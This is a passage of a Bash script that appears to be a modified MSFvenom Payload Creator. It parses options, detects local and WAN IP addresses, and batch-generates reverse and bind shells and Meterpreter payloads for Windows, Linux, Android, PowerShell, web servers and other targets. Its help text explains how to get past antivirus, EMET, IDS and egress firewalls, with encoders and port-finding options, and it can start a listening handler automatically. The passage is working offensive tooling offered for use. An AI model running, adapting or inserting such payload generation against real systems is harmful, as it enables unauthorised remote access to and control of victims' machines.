  echo -e "            ${BLUE}${SCRIPTNAME} windows x64 10.0.0.1${RESET}        # Windows 64-bit payload."
  echo -e "            ${BLUE}${SCRIPTNAME} handler windows 10.0.0.1${RESET}    # Handler .rc file only, no msfvenom payload."
  echo -e "            ${BLUE}${SCRIPTNAME} --dry-run windows 10.0.0.1${RESET}  # Show command without executing."
  echo -e "            ${BLUE}${SCRIPTNAME} --encoder x86/shikata_ga_nai windows 10.0.0.1${RESET}"
  echo -e "            ${BLUE}${SCRIPTNAME} --output /tmp windows 10.0.0.1${RESET}"
  echo -e "            ${BLUE}${SCRIPTNAME} help verbose${RESET}                # Help screen, with even more information."
  echo ""
  echo -e " <${BOLD}TYPE${RESET}>:"
  echo -e "   + ${YELLOW}APK${RESET}"
  echo -e "   + ${YELLOW}ASP${RESET}"
  echo -e "   + ${YELLOW}ASPX${RESET}"
  echo -e "   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]"
  echo -e "   + ${YELLOW}C#${RESET} [.${YELLOW}cs${RESET}]"
  echo -e "   + ${YELLOW}HTA${RESET}"
  echo -e "   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}]"
  echo -e "   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}]"
  echo -e "   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}]"
  echo -e "   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}]"
  echo -e "   + ${YELLOW}PHP${RESET}"
  echo -e "   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]"
  echo -e "   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]"
  echo -e "   + ${YELLOW}Raw${RESET} [.${YELLOW}bin${RESET}] (shellcode)"
  echo -e "   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
  echo -e "   + ${YELLOW}VBScript${RESET} [.${YELLOW}vbs${RESET}]"
  echo -e "   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}exe-service${RESET} // .${YELLOW}dll${RESET}]"
  echo ""
  echo -e " Rather than putting <DOMAIN/IP>, you can use an interface name and MSFPC will detect that IP address."
  echo -e " Missing <DOMAIN/IP> will default to the IP menu."
  echo ""
  echo -e " Missing <PORT> will default to 443."
  echo ""
  echo -e " <CMD> is a standard/native command prompt/terminal to interact with."
  echo -e " <MSF> is a custom cross-platform shell, gaining the full power of Metasploit."
  echo -e " Missing <CMD/MSF> will default to <MSF> where possible."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e "   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format."
    echo -e " <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limited Metasploit post modules/scripts support."
    echo -e " <MSF> payloads are generally much larger than <CMD>, as it comes with more features."
  fi
  echo ""
  echo -e " <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewall rules on the target."
  echo -e " <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with egress firewall rules on the target."
  echo -e " Missing <BIND/REVERSE> will default to <REVERSE>."
  [[ "${VERBOSE}" == "true" ]] \
    && echo -e " <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs the target to be repeatedly connecting back to permanently maintain access."
  echo ""
  echo -e " <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit."
  echo -e " <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>."
  echo -e " Missing <STAGED/STAGELESS> will default to <STAGED> where possible."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e "   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format."
    echo -e " <STAGED> are 'better' in low-bandwidth/high-latency environments."
    echo -e " <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS."
    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads"
    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payload-types/"
    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payloads/"
  fi
  echo ""
  echo -e " <TCP> is the standard method for connecting back. This is the most compatible with TYPES as it's RAW. Can be easily detected on IDSs."
  echo -e " <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection which limits port access on protocol — e.g. TCP 80."
  echo -e " <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using SSL. Helpful for packet inspection which limits port access on protocol — e.g. TCP 443."
  echo -e " <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with strict ingress/egress firewall rules. Will switch to 'allports' based on <TYPE>."
  echo -e " Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e " By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size."
    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
  fi
  echo ""
  echo -e " <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT>"
  echo -e " <LOOP> will just create one of each <TYPE>."
  echo ""
  echo -e " <VERBOSE> will display more information."
  echo ""
  echo -e " <X64> will generate 64-bit payloads instead of the default 32-bit (x86)."
  echo -e " <AARCH64> will generate ARM 64-bit payloads (Linux only)."
  echo -e " x64 supported for: ${YELLOW}Windows${RESET}, ${YELLOW}Linux${RESET}, ${YELLOW}OSX${RESET}, ${YELLOW}ASPX${RESET}, ${YELLOW}ASP${RESET}, ${YELLOW}Powershell${RESET}."
  echo -e " Missing <X64/X86> will default to <X86>."
  echo ""
  echo -e " <HANDLER> will generate only the Metasploit handler .rc file, ${BOLD}without${RESET} creating a payload via msfvenom."
  echo -e " Useful when you already have a payload or only need the handler configuration."
  echo ""
  echo -e " ${BOLD}Additional Flags${RESET}:"
  echo -e "   ${YELLOW}--encoder <name>${RESET}       Encoder to use (e.g. x86/shikata_ga_nai). Default: generic/none"
  echo -e "   ${YELLOW}--iterations <n>${RESET}       Number of encoding iterations"
  echo -e "   ${YELLOW}--output <path>${RESET}        Output directory for generated files"
  echo -e "   ${YELLOW}--format <fmt>${RESET}         Override output format (raw, c, hex, csharp, base64, etc.)"
  echo -e "   ${YELLOW}--dry-run${RESET}              Show commands without executing them"
  echo -e "   ${YELLOW}--listen${RESET}               Auto-start msfconsole handler after generation"
  echo ""
  echo -e " ${BOLD}Config File${RESET}: ${YELLOW}~/.msfpcrc${RESET}"
  echo -e "   Set defaults: port=443, arch=x64, encoder=x86/shikata_ga_nai, verbose=true, etc."
  exit 1
}


#-Start-------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}MSF${RESET}venom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MSFPC${RESET} v${BLUE}${VERSION}${RESET})"


## Check system — OS type
if [[ "$( \uname )" != "Linux" ]] && [[ "$( \uname )" != "Darwin" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Unix-like OS${RESET}" >&2
  exit 3
elif [[ "$( \uname )" = "Darwin" ]]; then
  DARWIN=true
fi

## Detect Metasploit Framework (Exegol-style bundle exec installations)
if [[ -d "/opt/tools/metasploit-framework" ]] && ! command -v msfvenom &>/dev/null; then
  _MSF_DIR="/opt/tools/metasploit-framework"
  _MSF_BUNDLE=""
  for _b in /usr/local/rvm/gems/*@metasploit-framework/wrappers/bundle; do
    [[ -x "$_b" ]] && _MSF_BUNDLE="$_b" && break
  done
  if [[ -n "${_MSF_BUNDLE}" ]]; then
    msfvenom()   { BUNDLE_GEMFILE="${_MSF_DIR}/Gemfile" "${_MSF_BUNDLE}" exec "${_MSF_DIR}/msfvenom" "$@"; }
    msfconsole() { BUNDLE_GEMFILE="${_MSF_DIR}/Gemfile" "${_MSF_BUNDLE}" exec "${_MSF_DIR}/msfconsole" "$@"; }
  fi
fi

## msfvenom installed? (skip check if handler/rc-only or dry-run mode detected)
_PRECHECK_SKIP=false
for _arg in "$@"; do
  case "$( echo "${_arg}" | tr '[:upper:]' '[:lower:]' )" in
    handler|rc|rconly|rc-only|handleronly|--rc-only|--handler-only|--handler|--rc) _PRECHECK_SKIP=true ;;
    --dry-run|dry-run|dryrun|--dryrun) _PRECHECK_SKIP=true ;;
  esac
done
if [[ "${_PRECHECK_SKIP}" != "true" ]] && ! type msfvenom &>/dev/null; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Install Metasploit Framework first: ${BOLD}apt install -y metasploit-framework${RESET}" >&2
  exit 3
fi


## Get NIC information (needed early for interface-name detection in arg parsing)
if [[ "$DARWIN" = "true" ]]; then   # OSX users
  IFACE=( $( for _iface in $( \ifconfig -l -u | \tr ' ' '\n' ); do if ( \ifconfig ${_iface} | \grep inet 1>/dev/null ); then echo ${_iface}; fi; done ) )
  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ifconfig "${IFACE[${i}]}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}' ) ); done
else    # nix users
  IFACE=( $( \awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__' ) )
  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ip addr list "${IFACE[${i}]}" | \grep 'inet ' | \cut -d' ' -f6 | \cut -d '/' -f1 ) ); done
fi


## cURL/wget — fetch external WAN IP (no eval — direct execution)
WAN=""
if command -v curl &>/dev/null || command -v wget &>/dev/null; then
  if command -v curl &>/dev/null; then
    _FETCHCMD=( curl -s --max-time 3 )
  else
    _FETCHCMD=( wget -U 'curl' --connect-timeout 3 -qO- )
  fi
  for url in 'https://ipinfo.io/ip' 'https://ifconfig.io/'; do
    WAN=$( "${_FETCHCMD[@]}" "${url}" 2>/dev/null )
    [[ -n "${WAN}" ]] && break
  done
fi


## Define TYPEs/FORMATs for keyword detection
TYPEs=(  apk  asp  aspx  bash  csharp  hta  java  linux    osx    perl  php  powershell  python  raw   tomcat  vbscript  windows )
FORMATs=(               sh    cs      hta  jsp   lin elf  macho  pl         ps1         py      bin   war     vbs       win exe exe-service dll srv )


## Parse command line arguments — single unified pass
## Handles both --flag options and positional keyword arguments
POSITIONAL_ARGS=()
while [[ $# -gt 0 ]]; do
  _arg="${1}"
  _arg_lower="$( echo "${_arg}" | tr '[:upper:]' '[:lower:]' )"

  case "${_arg_lower}" in
    ## Long flags with required value
    --platform|--type)     TYPE="${2}"; shift 2 ;;
    --platform=*|--type=*) TYPE="${_arg#*=}"; shift ;;
    --ip)                  IP="${2}"; shift 2 ;;
    --ip=*)                IP="${_arg#*=}"; shift ;;
    --port)                PORT="${2}"; shift 2 ;;
    --port=*)              PORT="${_arg#*=}"; shift ;;
    --shell)               SHELL="${2}"; shift 2 ;;
    --shell=*)             SHELL="${_arg#*=}"; shift ;;
    --direction)           DIRECTION="${2}"; shift 2 ;;
    --direction=*)         DIRECTION="${_arg#*=}"; shift ;;
    --stage)               STAGE="${2}"; shift 2 ;;
    --stage=*)             STAGE="${_arg#*=}"; shift ;;
    --method)              METHOD="${2}"; shift 2 ;;
    --method=*)            METHOD="${_arg#*=}"; shift ;;
    --arch)                ARCH="${2}"; shift 2 ;;
    --arch=*)              ARCH="${_arg#*=}"; shift ;;
    --encoder|-e)          ENCODER="${2}"; shift 2 ;;
    --encoder=*)           ENCODER="${_arg#*=}"; shift ;;
    --iterations|-i)       ITERATIONS="${2}"; shift 2 ;;
    --iterations=*)        ITERATIONS="${_arg#*=}"; shift ;;
    --output|-o)           OUTPATH="${2%/}/"; shift 2 ;;
    --output=*)            OUTPATH="${_arg#*=}"; OUTPATH="${OUTPATH%/}/"; shift ;;
    --format)              OUTFORMAT="${2}"; shift 2 ;;
    --format=*)            OUTFORMAT="${_arg#*=}"; shift ;;

    ## Long flags (boolean)
    --msf|--meterpreter)   SHELL="meterpreter"; shift ;;
    --cmd)                 SHELL="shell"; shift ;;
    --bind)                DIRECTION="bind"; shift ;;
    --rev|--reverse)       DIRECTION="reverse"; shift ;;
    --staged|--stager)     STAGE=true; shift ;;
    --stageless)           STAGE=false; shift ;;
    --tcp)                 METHOD="tcp"; shift ;;
    --http|--www)          METHOD="http"; shift ;;
    --https|--ssl|--tls)   METHOD="https"; shift ;;
    --find|--find_port|--find-port|--findport|--allports|--all-ports|--all_ports)
                           METHOD="find_port"; shift ;;
    --batch)               BATCH=true; shift ;;
    --loop)                LOOP=true; shift ;;
    --verbose)             VERBOSE=true; shift ;;
    --x64|--64)            ARCH="x64"; shift ;;
    --x86|--32)            ARCH="x86"; shift ;;
    --aarch64|--arm64)     ARCH="aarch64"; shift ;;
    --rc-only|--handler-only|--handler|--rc)
                           RCONLY=true; shift ;;
    --dry-run|--dryrun)    DRYRUN=true; shift ;;
    --listen)              LISTEN=true; shift ;;
    --help|-h)             HELP=true; shift ;;

    ## Short flags (unambiguous — no more -p/-t collisions)
    -v)  VERBOSE=true; shift ;;
    -b)  DIRECTION="bind"; shift ;;
    -r)  DIRECTION="reverse"; shift ;;
    -s)  STAGE=true; shift ;;
    -a)  BATCH=true; shift ;;
    -l)  LOOP=true; shift ;;

    ## Unknown flags
    --*|-*)
      echo -e " ${YELLOW}[i]${RESET} Invalid option: ${RED}${_arg}${RESET}" && exit 1 ;;

    ## Positional arguments — collected for magic detection below
    *)
      POSITIONAL_ARGS+=("${_arg_lower}")
      shift ;;
  esac
done


## (Magic Alert) Try to predict what's what from positional arguments
for x in "${POSITIONAL_ARGS[@]}"; do
    if [[ "${x}" == "list" || "${x}" == "ls" || "${x}" == "options" || "${x}" == "show" || "${x}" == "help" ]]; then HELP=true
  elif [[ "${x}" == "verbose" || "${x}" == "v" ]]; then VERBOSE=true
  elif [[ "${x}" == "all" || "${x}" == "batch" || "${x}" == "a" ]]; then BATCH=true
  elif [[ "${x}" == "loop" || "${x}" == "l" ]]; then LOOP=true
  elif [[ "${x}" == "cmd" || "${x}" == "shell" || "${x}" == "normal" ]]; then SHELL="shell"
  elif [[ "${x}" == "meterpreter" || "${x}" == "msf" || "${x}" == "meterp" ]]; then SHELL="meterpreter"
  elif [[ "${x}" == "bind" || "${x}" ==  "listen" ]]; then DIRECTION="bind"
  elif [[ "${x}" == "reverse" || "${x}" == "rev" ]]; then DIRECTION="reverse"
  elif [[ "${x}" == "staged" || "${x}" == "stager" || "${x}" == "stage" || "${x}" == "small" ]]; then STAGE=true
  elif [[ "${x}" == "stag"*"less" || "${x}" == "single" || "${x}" == "inline" || "${x}" == "no"* || "${x}" == "full" ]]; then STAGE=false
  elif [[ "${x}" == "x64" || "${x}" == "64" ]]; then ARCH="x64"
  elif [[ "${x}" == "x86" || "${x}" == "32" ]]; then ARCH="x86"
  elif [[ "${x}" == "aarch64" || "${x}" == "arm64" ]]; then ARCH="aarch64"
  elif [[ "${x}" == "handler" || "${x}" == "rc" || "${x}" == "rconly" || "${x}" == "rc-only" || "${x}" == "handleronly" ]]; then RCONLY=true
  elif [[ "${x}" == "dry-run" || "${x}" == "dryrun" ]]; then DRYRUN=true
  elif [[ "${x}" == "https" || "${x}" == "ssl" || "${x}" == "tls" ]]; then METHOD="https"
  elif [[ "${x}" == "http" || "${x}" == "www" ]]; then METHOD="http"
  elif [[ "${x}" == "tcp" ]]; then METHOD="tcp"
  elif [[ "${x}" == "find"* || "${x}" == "allport"* ]]; then METHOD="find_port"
  elif [[ "${x}" =~ ^[0-9]+$ && "${x}" -gt 0 && "${x}" -lt 65536 ]]; then PORT="${x}"
  elif [[ "${x}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then IP="${x}"
  elif [[ "${x}" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]]; then IP="${x}"   # IPv6
  elif [[ "${x}" == *.* ]]; then IP="${x}"                                              # Domain/DNS
  elif [[ "${x}" == "wan" && -n "${WAN}" ]]; then IP="${WAN}"
  else
    known=false
    for (( i=0; i<${#IFACE[@]}; ++i )); do [[ "${x}" == "${IFACE[${i}]}" ]] && IP="${IPs[${i}]}" && known=true && break; done
    for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ "${x}" == "${TYPEs[${i}]}" ]] && TYPE="${TYPEs[${i}]}" && known=true && break; done
    for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ "${x}" == "${FORMATs[${i}]}" ]] && TYPE="${FORMATs[${i}]}" && known=true && break; done
    [[ "${known}" == false ]] \
      && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" \
      && exit 1
  fi
done


## Display help?
[[ "${HELP}" == true ]] \
  && doHelp


## Verbose WAN report (now VERBOSE is set from args)
[[ "${VERBOSE}" == "true" && -z "${WAN}" ]] \
  && command -v curl &>/dev/null \
  && echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}" >&2


## Is there a writeable path for us?
if [[ ! -d "${OUTPATH}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Unable to use ${OUTPATH}${RESET}" >&2
  exit 3
fi


## Get default values (before batch/loop)
[[ -z "${PORT}" ]] \
  && PORT="443"


## Check user input — able to detect NIC interfaces?
if [[ -z "${IFACE}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find any network interfaces${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${SCRIPTNAME} --ip <IP>${RESET}" >&2
  exit 2
fi

## Able to detect IP addresses?
if [[ -z "${IPs}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${SCRIPTNAME} --ip <IP>${RESET}" >&2
  exit 2
fi


## Normalize input values
## Shell
  if [[ "${SHELL}" == "shell" || "${SHELL}" == "cmd" || "${SHELL}" == "normal" ]]; then SHELL="shell"
elif [[ "${SHELL}" == "meterpreter" || "${SHELL}" == "msf" || "${SHELL}" == "meterp" ]]; then SHELL="meterpreter"; fi

## Direction
  if [[ "${DIRECTION}" == "reverse" || "${DIRECTION}" == "rev" ]]; then DIRECTION="reverse"
elif [[ "${DIRECTION}" == "bind" || "${DIRECTION}" == "listen" ]]; then DIRECTION="bind"; fi

## Stage
  if [[ "${STAGE}" == "true" || "${STAGE}" == "staged" || "${STAGE}" == "stager" || "${STAGE}" == "stage" || "${STAGE}" == "small" ]]; then STAGE='staged'; _STAGE='/'
elif [[ "${STAGE}" == "false" || "${STAGE}" == "stage"*"less" || "${STAGE}" == "single" || "${STAGE}" == "inline" || "${STAGE}" == "no"* || "${STAGE}" == "full" ]]; then STAGE='stageless'; _STAGE='_'; fi

## Method
  if [[ "${METHOD}" == "tcp" ]]; then METHOD="tcp"
elif [[ "${METHOD}" == "http" || "${METHOD}" == "www" ]]; then METHOD="http"
elif [[ "${METHOD}" == "https" || "${METHOD}" == "tls" || "${METHOD}" == "ssl" ]]; then METHOD="https"
elif [[ "${METHOD}" == "find"* || "${METHOD}" == "all"* ]]; then METHOD="find_port"; fi

## Did user enter an interface instead of an IP address?
for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=${IPs[${x}]} && break; done

## WAN interface?
if [[ -n "${WAN}" && "${IP}" == "${WAN}" ]]; then
  [[ "${VERBOSE}" == "true" ]] \
    && echo -e " ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  "
fi

## IP address validation — IPv4
if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
  IP_PARTS=("${match[@]:-${BASH_REMATCH[@]}}")
  for (( i=1; i<${#IP_PARTS[@]}; ++i )); do
    (( ${IP_PARTS[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
  done
## IPv6 — basic format check (let msfvenom handle full validation)
elif [[ "${IP}" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]]; then
  [[ "${VERBOSE}" == "true" ]] \
    && echo -e " ${YELLOW}[i]${RESET} IPv6 address detected: ${YELLOW}${IP}${RESET}"
elif [[ -n "${IP}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
  DOMAIN=true
fi

## Valid port?
if [[ "${PORT}" -lt 1 || "${PORT}" -gt 65535 ]]; then
  echo -e " ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}" >&2
  exit 3
fi


## IP menu (reuses existing IFACE/IPs arrays — no re-scanning)
if [[ -n "${TYPE}" && -z "${IP}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET} — ${YELLOW}IP address${RESET}?:"
  I=0
  for iface in "${IFACE[@]}"; do
    [[ -z "${IPs[${I}]}" ]] && IPs[${I}]="UNKNOWN"
    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$((I+1))${RESET}.) ${BLUE}${iface}${RESET} — ${YELLOW}${IPs[${I}]}${RESET}"
    I=$((I+1))
  done
  [[ -n "${WAN}" ]] \
    && I=$((I+1)) \
    && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}${I}${RESET}.) ${BLUE}wan${RESET} — ${YELLOW}${WAN}${RESET}"
  _IP=""
  while [[ -z "${_IP}" ]]; do
    echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}: "
    read INPUT
    for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP="${IPs[${x}]}"; done
    [[ -n "${WAN}" && "${INPUT}" == "wan" ]] && _IP="${WAN}"
    [[ "${INPUT}" != *"."* && "${INPUT}" != *":"* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] 2>/dev/null && _IP="${IPs[${INPUT}-1]}"
    [[ "${INPUT}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP="${INPUT}"
    [[ "${INPUT}" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]] && _IP="${INPUT}"   # IPv6
    IP="${_IP}"
  done
  echo ""
fi


## Generate — dispatch based on mode

## Loop mode — one of each TYPE with default values
if [[ "${LOOP}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Loop Mode. ${BOLD}Creating one of each TYPE${RESET}, with default values"

  _SAVE_SHELL="${SHELL}"; _SAVE_STAGE="${STAGE}"; _SAVE_DIRECTION="${DIRECTION}"; _SAVE_METHOD="${METHOD}"

  for (( i=0; i<${#TYPEs[@]}; ++i )); do
    TYPE="${TYPEs[${i}]}"
    SHELL="${_SAVE_SHELL}"; STAGE="${_SAVE_STAGE}"; DIRECTION="${_SAVE_DIRECTION}"; METHOD="${_SAVE_METHOD}"
    [[ "${STAGE}" == "staged" ]] && _STAGE='/'; [[ "${STAGE}" == "stageless" ]] && _STAGE='_'
    echo ""
    generatePayload
    echo ""
  done

  ## DLL — the odd one out
  TYPE="dll"
  SHELL="${_SAVE_SHELL}"; STAGE="${_SAVE_STAGE}"; DIRECTION="${_SAVE_DIRECTION}"; METHOD="${_SAVE_METHOD}"
  [[ "${STAGE}" == "staged" ]] && _STAGE='/'; [[ "${STAGE}" == "stageless" ]] && _STAGE='_'
  echo ""
  generatePayload
  echo ""


## Batch mode — every possible combination
elif [[ "${BATCH}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}"

  _SAVE_TYPE="${TYPE}"; _SAVE_SHELL="${SHELL}"; _SAVE_STAGE="${STAGE}"
  _SAVE_DIRECTION="${DIRECTION}"; _SAVE_METHOD="${METHOD}"

  for (( i=0; i<${#TYPEs[@]}; ++i )); do
    ## Filter by user's TYPE constraint
    if [[ -z "${_SAVE_TYPE}" || "${TYPEs[${i}]}" == "${_SAVE_TYPE}" || "${FORMATs[${i}]}" == "${_SAVE_TYPE}" ]]; then
      _batch_type="${TYPEs[${i}]}"
      [[ -n "${_SAVE_TYPE}" && "${FORMATs[${i}]}" == "${_SAVE_TYPE}" ]] && _batch_type="${FORMATs[${i}]}"

      for _shell in "meterpreter" "shell"; do
        [[ -n "${_SAVE_SHELL}" && "${_shell}" != "${_SAVE_SHELL}" ]] && continue

        for _direction in "reverse" "bind"; do
          [[ -n "${_SAVE_DIRECTION}" && "${_direction}" != "${_SAVE_DIRECTION}" ]] && continue

          for _staged in "staged" "stageless"; do
            [[ -n "${_SAVE_STAGE}" && "${_staged}" != "${_SAVE_STAGE}" ]] && continue

            for _method in "tcp" "http" "https" "find_port"; do
              [[ -n "${_SAVE_METHOD}" && "${_method}" != "${_SAVE_METHOD}" ]] && continue

              TYPE="${_batch_type}"; SHELL="${_shell}"; DIRECTION="${_direction}"
              STAGE="${_staged}"; METHOD="${_method}"
              [[ "${STAGE}" == "staged" ]] && _STAGE='/' || _STAGE='_'
              echo ""
              generatePayload
              echo ""
            done   # method
          done     # staged
        done       # direction
      done         # shell
      echo -e "\n"
    fi
  done             # TYPEs


## Single payload mode
elif [[ -n "${TYPE}" ]]; then
  generatePayload


## Blank input
elif [[ -z "${TYPE}" && "${BATCH}" != "true" && "${LOOP}" != "true" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing TYPE${RESET} or ${YELLOW}BATCH/LOOP mode${RESET}"
fi


#-Done--------------------------------------------------------#


##### Done!
if [[ "${SUCCESS}" == true ]]; then
  echo -e " ${GREEN}[?]${RESET} ${GREEN}Quick web server${RESET} (for file transfer)?: python3 -m http.server 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
else
  doHelp
fi

exit 0
